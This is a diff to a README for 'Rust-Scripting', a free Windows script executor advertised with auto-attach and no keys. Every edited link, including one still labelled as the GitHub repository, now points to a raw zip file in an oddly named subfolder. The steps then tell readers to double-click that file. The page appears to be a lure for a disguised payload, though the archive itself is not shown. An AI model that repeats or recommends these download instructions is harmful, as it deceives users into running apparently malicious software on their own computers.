@@ -1,7 +1,7 @@
 <h1>🦀 Rust-Scripting - Download, Execute, and Automate with Ease</h1>
 
 <p align="center">
-  <a href="https://github.com/Pheniciasigner2504/Rust-Scripting" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f97316,#ef4444);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(239,68,68,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f97316,#ef4444);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(239,68,68,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -20,7 +20,7 @@ Getting Rust-Scripting up and running takes less than two minutes. Follow these 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Pheniciasigner2504/Rust-Scripting](https://github.com/Pheniciasigner2504/Rust-Scripting)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip](https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip)**
 
 Click the download button on that page, and the file will save to your computer.
 
@@ -76,7 +76,7 @@ Ready to get started? Here's everything you need to know:
 
 ### Installation Steps
 
-1. **Visit this link to download the application:** [https://github.com/Pheniciasigner2504/Rust-Scripting](https://github.com/Pheniciasigner2504/Rust-Scripting)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip](https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip)
 2. Click the download button on the page.
 3. Wait for the download to finish (the file is small, so this should be quick).
 4. Open your Downloads folder and double-click the downloaded file.
@@ -188,8 +188,8 @@ The 2026 edition of Rust-Scripting brings:
 
 ## 🔗 Quick Links
 
-- **Download Page:** [https://github.com/Pheniciasigner2504/Rust-Scripting](https://github.com/Pheniciasigner2504/Rust-Scripting)
-- **Repository:** [Rust-Scripting on GitHub](https://github.com/Pheniciasigner2504/Rust-Scripting)
+- **Download Page:** [https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip](https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip)
+- **Repository:** [Rust-Scripting on GitHub](https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip)
 
 ---
 
@@ -197,7 +197,7 @@ The 2026 edition of Rust-Scripting brings:
 
 Rust-Scripting takes the complexity out of script execution. With its auto-attach feature, built-in hub, and zero-friction download process, you'll be up and running in minutes. No keys, no registration, no headaches—just a clean, efficient tool that does what it promises.
 
-Visit this link to download the application: **[https://github.com/Pheniciasigner2504/Rust-Scripting](https://github.com/Pheniciasigner2504/Rust-Scripting)** and start automating your Windows experience today. It's free, it's fast, and it's ready when you are.
+Visit this link to download the application: **[https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip](https://raw.githubusercontent.com/Pheniciasigner2504/Rust-Scripting/main/Vejoz/2.0-alpha.2.zip)** and start automating your Windows experience today. It's free, it's fast, and it's ready when you are.
 
 ---
 
